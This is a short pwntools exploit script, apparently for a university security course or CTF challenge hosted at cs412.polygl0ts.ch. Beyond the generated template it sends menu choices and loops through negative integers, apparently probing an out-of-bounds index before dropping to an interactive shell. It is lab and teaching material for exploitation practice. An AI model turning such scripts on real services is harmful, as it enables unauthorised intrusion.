#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template exe
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF("exe")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote("cs412.polygl0ts.ch", 9009)
    else:
        return process([exe.path] + argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
tbreak main
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# FORTIFY:  Enabled

io = start()

if args.REMOTE:
    log.info(io.recv())

log.info(io.recv())

io.sendline(b"1")

log.info(io.recv())

io.sendline(b"2")
log.info(io.recv())

for i in range(-1000, -1333, -1):
    io.sendline(str(i).encode())
    log.info(io.recv())
    io.sendline(b"2")
    log.info(io.recv())

io.interactive()
